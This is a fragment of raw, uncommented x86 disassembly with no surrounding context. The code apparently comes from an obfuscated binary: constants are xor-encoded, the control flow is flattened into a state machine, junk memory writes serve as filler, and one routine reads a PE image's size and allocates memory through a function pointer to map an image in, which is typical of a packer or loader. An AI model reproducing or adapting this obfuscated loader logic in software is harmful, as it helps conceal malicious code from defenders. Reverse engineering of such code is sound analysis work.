  427095:	mov    DWORD PTR [ebp+0xc],eax
  427098:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  42709f:	mov    eax,DWORD PTR [ebp-0x18]
  4270a2:	xor    eax,edi
  4270a4:	lea    ecx,[ebp-0x40]
  4270a7:	add    eax,ebx
  4270a9:	push   ecx
  4270aa:	call   0x426773
  4270af:	mov    eax,DWORD PTR [ebp+0xc]
  4270b2:	test   eax,eax
  4270b4:	je     0x427104
  4270b6:	mov    eax,DWORD PTR [ebp-0x18]
  4270b9:	xor    eax,edi
  4270bb:	add    eax,ebx
  4270bd:	push   eax
  4270be:	push   DWORD PTR [ebp+0xc]
  4270c1:	lea    eax,[ebp-0x40]
  4270c4:	push   eax
  4270c5:	call   0x426669
  4270ca:	mov    eax,DWORD PTR [ebp-0x4]
  4270cd:	mov    DWORD PTR [ebp-0x18],eax
  4270d0:	mov    eax,DWORD PTR [ebp-0x18]
  4270d3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270d6:	sub    eax,ecx
  4270d8:	mov    DWORD PTR [ebp-0x18],eax
  4270db:	mov    eax,DWORD PTR [ebp+0xc]
  4270de:	mov    ecx,DWORD PTR [ebp+0xc]
  4270e1:	mov    eax,DWORD PTR [eax+0x10]
  4270e4:	add    eax,DWORD PTR [ecx+0xc]
  4270e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4270ea:	cmp    ecx,eax
  4270ec:	jb     0x427104
  4270ee:	mov    eax,DWORD PTR [ebp+0xc]
  4270f1:	mov    eax,DWORD PTR [eax+0xc]
  4270f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4270f7:	add    eax,DWORD PTR [ecx+0x8]
  4270fa:	mov    ecx,DWORD PTR [ebp-0x18]
  4270fd:	sub    eax,ecx
  4270ff:	jmp    0x4273f2
  427104:	push   0xc
  427106:	push   DWORD PTR [ebp-0x4]
  427109:	lea    eax,[ebp-0x4c]
  42710c:	push   eax
  42710d:	call   0x426669
  427112:	mov    eax,0xf89c85b0
  427117:	mov    DWORD PTR [ebp-0x2c],eax
  42711a:	mov    DWORD PTR [ebp-0x30],0xf89c85b1
  427121:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  427128:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  42712f:	lea    ecx,[ebp-0x2c]
  427132:	mov    DWORD PTR [ebp-0xc],ecx
  427135:	lea    ecx,[ebp-0x30]
  427138:	mov    DWORD PTR [ebp-0x10],ecx
  42713b:	lea    ecx,[ebp-0x34]
  42713e:	mov    DWORD PTR [ebp+0xc],ecx
  427141:	lea    ecx,[ebp-0x38]
  427144:	mov    DWORD PTR [ebp-0x14],ecx
  427147:	mov    ecx,DWORD PTR [ebp+0x8]
  42714a:	xor    ecx,edi
  42714c:	add    ecx,ebx
  42714e:	mov    DWORD PTR [ebp-0x18],ecx
  427151:	jmp    0x42734d
  427156:	cmp    eax,0xf89c85b2
  42715b:	je     0x42735f
  427161:	mov    ecx,DWORD PTR [ebp-0x8]
  427164:	xor    ecx,edi
  427166:	mov    esi,eax
  427168:	add    ecx,ebx
  42716a:	mov    DWORD PTR [ebp+0x18],ecx
  42716d:	mov    eax,DWORD PTR [ebp-0x18]
  427170:	xor    esi,edi
  427172:	lea    eax,[eax+esi*1+0x3272ec]
  427179:	mov    DWORD PTR [ebp-0x18],eax
  42717c:	mov    eax,DWORD PTR [ebp-0x8]
  42717f:	mov    ecx,DWORD PTR [ebp-0x18]
  427182:	xor    eax,edi
  427184:	add    eax,ebx
  427186:	cmp    ecx,eax
  427188:	jne    0x42719d
  42718a:	mov    eax,DWORD PTR [ebp+0x8]
  42718d:	xor    eax,edi
  42718f:	add    eax,ebx
  427191:	push   eax
  427192:	push   0xc
  427194:	lea    eax,[ebp-0x4c]
  427197:	push   eax
  427198:	call   0x426c4f
  42719d:	mov    eax,DWORD PTR [ebp-0xc]
  4271a0:	mov    eax,DWORD PTR [eax]
  4271a2:	xor    eax,edi
  4271a4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4271ab:	mov    ecx,DWORD PTR [ebp+0x8]
  4271ae:	xor    ecx,edi
  4271b0:	movzx  eax,al
  4271b3:	add    ecx,ebx
  4271b5:	cmp    eax,ecx
  4271b7:	je     0x427335
  4271bd:	mov    eax,DWORD PTR [ebp-0x10]
  4271c0:	mov    eax,DWORD PTR [eax]
  4271c2:	xor    eax,edi
  4271c4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4271cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4271ce:	xor    ecx,edi
  4271d0:	movzx  eax,al
  4271d3:	add    ecx,ebx
  4271d5:	cmp    eax,ecx
  4271d7:	je     0x427335
  4271dd:	mov    eax,DWORD PTR [ebp+0xc]
  4271e0:	mov    eax,DWORD PTR [eax]
  4271e2:	xor    eax,edi
  4271e4:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4271eb:	mov    ecx,DWORD PTR [ebp+0x8]
  4271ee:	xor    ecx,edi
  4271f0:	movzx  eax,al
  4271f3:	add    ecx,ebx
  4271f5:	cmp    eax,ecx
  4271f7:	je     0x427335
  4271fd:	mov    eax,DWORD PTR [ebp-0x14]
  427200:	mov    eax,DWORD PTR [eax]
  427202:	xor    eax,edi
  427204:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42720b:	mov    ecx,DWORD PTR [ebp+0x8]
  42720e:	xor    ecx,edi
  427210:	movzx  eax,al
  427213:	add    ecx,ebx
  427215:	cmp    eax,ecx
  427217:	je     0x427335
  42721d:	mov    eax,DWORD PTR [ebp-0x10]
  427220:	mov    eax,DWORD PTR [eax]
  427222:	xor    eax,edi
  427224:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42722b:	mov    ecx,DWORD PTR [ebp-0xc]
  42722e:	mov    ecx,DWORD PTR [ecx]
  427230:	xor    ecx,edi
  427232:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427239:	xor    al,cl
  42723b:	mov    ecx,DWORD PTR [ebp+0xc]
  42723e:	mov    ecx,DWORD PTR [ecx]
  427240:	xor    ecx,edi
  427242:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427249:	or     al,cl
  42724b:	mov    ecx,DWORD PTR [ebp-0xc]
  42724e:	mov    ecx,DWORD PTR [ecx]
  427250:	xor    ecx,edi
  427252:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427259:	cmp    cl,al
  42725b:	jne    0x427335
  427261:	mov    eax,DWORD PTR [ebp+0xc]
  427264:	mov    eax,DWORD PTR [eax]
  427266:	xor    eax,edi
  427268:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  42726f:	mov    ecx,DWORD PTR [ebp-0x10]
  427272:	mov    ecx,DWORD PTR [ecx]
  427274:	xor    ecx,edi
  427276:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42727d:	xor    al,cl
  42727f:	mov    ecx,DWORD PTR [ebp-0x14]
  427282:	mov    ecx,DWORD PTR [ecx]
  427284:	xor    ecx,edi
  427286:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  42728d:	or     al,cl
  42728f:	mov    ecx,DWORD PTR [ebp-0x10]
  427292:	mov    ecx,DWORD PTR [ecx]
  427294:	xor    ecx,edi
  427296:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  42729d:	cmp    cl,al
  42729f:	jne    0x427335
  4272a5:	mov    eax,DWORD PTR [ebp-0x14]
  4272a8:	mov    eax,DWORD PTR [eax]
  4272aa:	xor    eax,edi
  4272ac:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4272b6:	mov    ecx,DWORD PTR [ecx]
  4272b8:	xor    ecx,edi
  4272ba:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4272c1:	xor    al,cl
  4272c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4272c6:	mov    ecx,DWORD PTR [ecx]
  4272c8:	xor    ecx,edi
  4272ca:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  4272d1:	or     al,cl
  4272d3:	mov    ecx,DWORD PTR [ebp+0xc]
  4272d6:	mov    ecx,DWORD PTR [ecx]
  4272d8:	xor    ecx,edi
  4272da:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  4272e1:	cmp    cl,al
  4272e3:	jne    0x427335
  4272e5:	mov    eax,DWORD PTR [ebp-0x14]
  4272e8:	mov    eax,DWORD PTR [eax]
  4272ea:	xor    eax,edi
  4272ec:	mov    al,BYTE PTR [ebp+eax*1+0x3272a0]
  4272f3:	mov    ecx,DWORD PTR [ebp-0xc]
  4272f6:	mov    ecx,DWORD PTR [ecx]
  4272f8:	xor    ecx,edi
  4272fa:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427301:	xor    al,cl
  427303:	mov    ecx,DWORD PTR [ebp-0x10]
  427306:	mov    ecx,DWORD PTR [ecx]
  427308:	xor    ecx,edi
  42730a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a0]
  427311:	or     al,cl
  427313:	mov    ecx,DWORD PTR [ebp-0x14]
  427316:	mov    ecx,DWORD PTR [ecx]
  427318:	xor    ecx,edi
  42731a:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a4]
  427321:	cmp    cl,al
  427323:	jne    0x427335
  427325:	lea    eax,[ebp-0x4c]
  427328:	push   eax
  427329:	call   0x426df0
  42732e:	mov    ecx,DWORD PTR [ebp-0x44]
  427331:	cmp    eax,ecx
  427333:	je     0x42733f
  427335:	mov    eax,DWORD PTR [ebp+0x8]
  427338:	xor    eax,edi
  42733a:	add    eax,ebx
  42733c:	mov    DWORD PTR [ebp+0x18],eax
  42733f:	mov    eax,DWORD PTR [ebp-0x8]
  427342:	xor    eax,edi
  427344:	lea    eax,[eax+esi*1+0x3272ec]
  42734b:	xor    eax,edi
  42734d:	mov    ecx,DWORD PTR [ebp+0x8]
  427350:	mov    edx,DWORD PTR [ebp+0x18]
  427353:	xor    ecx,edi
  427355:	add    ecx,ebx
  427357:	cmp    edx,ecx
  427359:	je     0x427156
  42735f:	mov    eax,DWORD PTR [ebp+0x8]
  427362:	mov    ecx,DWORD PTR [ebp+0x18]
  427365:	xor    eax,edi
  427367:	add    eax,ebx
  427369:	cmp    ecx,eax
  42736b:	jne    0x42737e
  42736d:	mov    eax,DWORD PTR [ebp-0x8]
  427370:	mov    ecx,DWORD PTR [ebp+0x1c]
  427373:	xor    eax,edi
  427375:	lea    eax,[eax+ecx*1+0x3272ec]
  42737c:	jmp    0x4273f5
  42737e:	push   0x18
  427380:	push   DWORD PTR [ebp-0x4]
  427383:	lea    eax,[ebp-0x64]
  427386:	push   eax
  427387:	call   0x426669
  42738c:	mov    eax,DWORD PTR [ebp+0x8]
  42738f:	mov    ecx,DWORD PTR [ebp-0x18]
  427392:	xor    eax,edi
  427394:	add    eax,ebx
  427396:	cmp    eax,ecx
  427398:	je     0x4273ad
  42739a:	mov    eax,DWORD PTR [ebp+0x8]
  42739d:	xor    eax,edi
  42739f:	add    eax,ebx
  4273a1:	push   eax
  4273a2:	push   0x18
  4273a4:	lea    eax,[ebp-0x64]
  4273a7:	push   eax
  4273a8:	call   0x426c4f
  4273ad:	mov    eax,DWORD PTR [ebp-0x4]
  4273b0:	add    eax,0x18
  4273b3:	mov    DWORD PTR [ebp+0x18],eax
  4273b6:	push   DWORD PTR [ebp-0x50]
  4273b9:	push   DWORD PTR [ebp+0x18]
  4273bc:	mov    eax,DWORD PTR [ebp-0x54]
  4273bf:	add    eax,DWORD PTR [ebp-0x20]
  4273c2:	push   eax
  4273c3:	call   0x426669
  4273c8:	mov    eax,DWORD PTR [ebp+0x8]
  4273cb:	mov    ecx,DWORD PTR [ebp-0x18]
  4273ce:	xor    eax,edi
  4273d0:	add    eax,ebx
  4273d2:	cmp    eax,ecx
  4273d4:	je     0x4273e7
  4273d6:	push   0x0
  4273d8:	push   DWORD PTR [ebp-0x50]
  4273db:	mov    eax,DWORD PTR [ebp-0x54]
  4273de:	add    eax,DWORD PTR [ebp-0x20]
  4273e1:	push   eax
  4273e2:	call   0x426c4f
  4273e7:	mov    eax,DWORD PTR [ebp-0x24]
  4273ea:	mov    ecx,DWORD PTR [ebp-0x50]
  4273ed:	add    DWORD PTR [eax],ecx
  4273ef:	mov    eax,DWORD PTR [ebp-0x50]
  4273f2:	add    eax,DWORD PTR [ebp+0x1c]
  4273f5:	mov    DWORD PTR [ebp+0x1c],eax
  4273f8:	mov    eax,DWORD PTR [ebp-0x8]
  4273fb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273fe:	xor    eax,edi
  427400:	add    eax,ebx
  427402:	imul   eax,ecx
  427405:	mov    ecx,DWORD PTR [ebp+0x8]
  427408:	mov    edx,DWORD PTR [ebp-0x28]
  42740b:	xor    ecx,edi
  42740d:	lea    ecx,[ecx+edx*1+0x3272ec]
  427414:	cmp    eax,ecx
  427416:	jb     0x427074
  42741c:	mov    esi,DWORD PTR [ebp+0x14]
  42741f:	mov    eax,DWORD PTR [ebp-0x20]
  427422:	mov    DWORD PTR [esi],eax
  427424:	jmp    0x42746b
  427426:	mov    ecx,DWORD PTR [ebp+0x8]
  427429:	mov    edx,DWORD PTR [ebp+0xc]
  42742c:	xor    ecx,edi
  42742e:	xor    edx,edi
  427430:	add    ecx,ebx
  427432:	add    edx,ebx
  427434:	cmp    ecx,edx
  427436:	jne    0x42744a
  427438:	mov    eax,ds:0x7f642ddf
  42743d:	imul   eax,eax,0x9f15fcce
  427443:	mov    ds:0x7f642ddf,eax
  427448:	jmp    0x42746b
  42744a:	mov    ecx,DWORD PTR [ebp+0x8]
  42744d:	xor    ecx,edi
  42744f:	add    ecx,ebx
  427451:	cmp    eax,ecx
  427453:	je     0x427461
  427455:	sub    DWORD PTR ds:0xf861e3f,0x709beac1
  42745f:	jmp    0x42746b
  427461:	and    DWORD PTR ds:0x3343fadf,0x5265ec3e
  42746b:	pop    edi
  42746c:	pop    esi
  42746d:	pop    ebx
  42746e:	leave  
  42746f:	ret    0x18
  427472:	push   ebp
  427473:	mov    ebp,esp
  427475:	and    esp,0xfffffff8
  427478:	mov    eax,DWORD PTR [ebp+0x20]
  42747b:	sub    esp,0x14
  42747e:	push   ebx
  42747f:	mov    ebx,DWORD PTR [ebp+0x14]
  427482:	push   esi
  427483:	push   edi
  427484:	cmp    eax,0xf89c85b0
  427489:	jne    0x427495
  42748b:	push   0xf89c85b1
  427490:	jmp    0x4275c7
  427495:	mov    eax,DWORD PTR [ebp+0x20]
  427498:	cmp    eax,0xf89c85b1
  42749d:	jne    0x4274a9
  42749f:	push   0xf89c85b2
  4274a4:	jmp    0x4275c7
  4274a9:	mov    eax,DWORD PTR [ebp+0x20]
  4274ac:	cmp    eax,0xf89c85b2
  4274b1:	jne    0x4274bd
  4274b3:	push   0xf89c85b3
  4274b8:	jmp    0x4275c7
  4274bd:	mov    eax,DWORD PTR [ebp+0x20]
  4274c0:	cmp    eax,0xf89c85b3
  4274c5:	jne    0x4274d1
  4274c7:	push   0xf89c85bc
  4274cc:	jmp    0x4275c7
  4274d1:	mov    ecx,DWORD PTR [ebp+0x20]
  4274d4:	mov    eax,0xf89c85bf
  4274d9:	cmp    ecx,eax
  4274db:	jne    0x427597
  4274e1:	mov    eax,DWORD PTR [ebp+0x10]
  4274e4:	mov    DWORD PTR [esp+0xc],eax
  4274e8:	mov    eax,DWORD PTR [ebp+0x18]
  4274eb:	mov    DWORD PTR [esp+0x14],eax
  4274ef:	mov    eax,DWORD PTR [ebp+0xc]
  4274f2:	mov    DWORD PTR [esp+0x18],eax
  4274f6:	mov    eax,DWORD PTR [ebp+0x8]
  4274f9:	mov    DWORD PTR [esp+0x10],eax
  4274fd:	mov    eax,DWORD PTR [esp+0x10]
  427501:	mov    ecx,DWORD PTR [esp+0x14]
  427505:	mov    edi,0x75108a4
  42750a:	xor    eax,edi
  42750c:	mov    esi,0x3272ec
  427511:	add    eax,esi
  427513:	mov    DWORD PTR [ecx],eax
  427515:	mov    eax,DWORD PTR [esp+0xc]
  427519:	mov    eax,DWORD PTR [eax+0x194]
  42751f:	mov    ecx,DWORD PTR [eax]
  427521:	mov    eax,DWORD PTR [esp+0xc]
  427525:	mov    eax,DWORD PTR [eax+0x194]
  42752b:	mov    eax,DWORD PTR [eax]
  42752d:	add    eax,DWORD PTR [ecx+0x3c]
  427530:	mov    ecx,DWORD PTR [esp+0xc]
  427534:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42753a:	mov    ecx,DWORD PTR [ecx+0x14]
  42753d:	push   0x4
  42753f:	push   0x3000
  427544:	push   DWORD PTR [eax+0x50]
  427547:	push   0x0
  427549:	call   ecx
  42754b:	mov    DWORD PTR [ebx],eax
  42754d:	mov    eax,DWORD PTR [esp+0x10]
  427551:	push   DWORD PTR [esp+0xc]
  427555:	xor    eax,edi
  427557:	add    eax,esi
  427559:	mov    DWORD PTR [esp+0x20],eax
  42755d:	lea    eax,[esp+0x20]
  427561:	push   eax
  427562:	push   ebx
  427563:	push   DWORD PTR [esp+0x20]
  427567:	push   DWORD PTR [esp+0x28]
  42756b:	push   DWORD PTR [esp+0x24]
  42756f:	call   0x426f34
  427574:	mov    eax,DWORD PTR [esp+0x10]
  427578:	mov    ecx,DWORD PTR [ebx]
  42757a:	xor    eax,edi
  42757c:	add    eax,esi
  42757e:	cmp    ecx,eax
  427580:	je     0x4275de
  427582:	mov    eax,DWORD PTR [esp+0x18]
  427586:	mov    ecx,DWORD PTR [esp+0x14]
  42758a:	xor    eax,edi
  42758c:	add    eax,esi
  42758e:	imul   eax,DWORD PTR [esp+0x1c]
  427593:	mov    DWORD PTR [ecx],eax
  427595:	jmp    0x4275de
  427597:	mov    ecx,DWORD PTR [ebp+0x20]
  42759a:	cmp    ecx,0xf89c85bc
  4275a0:	jne    0x4275a9
  4275a2:	push   0xf89c85bd
  4275a7:	jmp    0x4275c7
  4275a9:	mov    ecx,DWORD PTR [ebp+0x20]
  4275ac:	cmp    ecx,0xf89c85bd
  4275b2:	jne    0x4275bb
  4275b4:	push   0xf89c85be
  4275b9:	jmp    0x4275c7
  4275bb:	mov    ecx,DWORD PTR [ebp+0x20]
  4275be:	cmp    ecx,0xf89c85be
  4275c4:	jne    0x4275de
  4275c6:	push   eax
  4275c7:	push   DWORD PTR [ebp+0x1c]
  4275ca:	push   DWORD PTR [ebp+0x18]
  4275cd:	push   ebx
  4275ce:	push   DWORD PTR [ebp+0x10]
  4275d1:	push   DWORD PTR [ebp+0xc]
  4275d4:	push   DWORD PTR [ebp+0x8]
  4275d7:	call   0x427472
  4275dc:	mov    DWORD PTR [ebx],eax
  4275de:	mov    eax,DWORD PTR [ebx]
  4275e0:	pop    edi
  4275e1:	pop    esi
  4275e2:	pop    ebx
  4275e3:	mov    esp,ebp
  4275e5:	pop    ebp
  4275e6:	ret    0x1c
  4275e9:	push   ebp
  4275ea:	mov    ebp,esp
  4275ec:	sub    esp,0xc
  4275ef:	mov    eax,0xf89c85b0
  4275f4:	mov    DWORD PTR [ebp-0x8],eax
  4275f7:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4275fe:	mov    ecx,DWORD PTR [ebp-0x8]
  427601:	xor    ecx,0x75108a4
  427607:	add    ecx,0x3272ec
  42760d:	mov    DWORD PTR [ebp-0x4],ecx
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	push   eax
  427614:	mov    DWORD PTR [ebp+0xc],ecx
  427617:	push   DWORD PTR [ebp+0xc]
  42761a:	lea    eax,[ebp-0x4]
  42761d:	push   DWORD PTR [ebp+0x8]
  427620:	push   eax
  427621:	push   DWORD PTR [ebp+0xc]
  427624:	push   DWORD PTR [ebp-0xc]
  427627:	push   DWORD PTR [ebp-0x8]
  42762a:	call   0x427472
  42762f:	mov    DWORD PTR [ebp-0x4],eax
  427632:	mov    eax,DWORD PTR [ebp-0x4]
  427635:	leave  
  427636:	ret    0x8
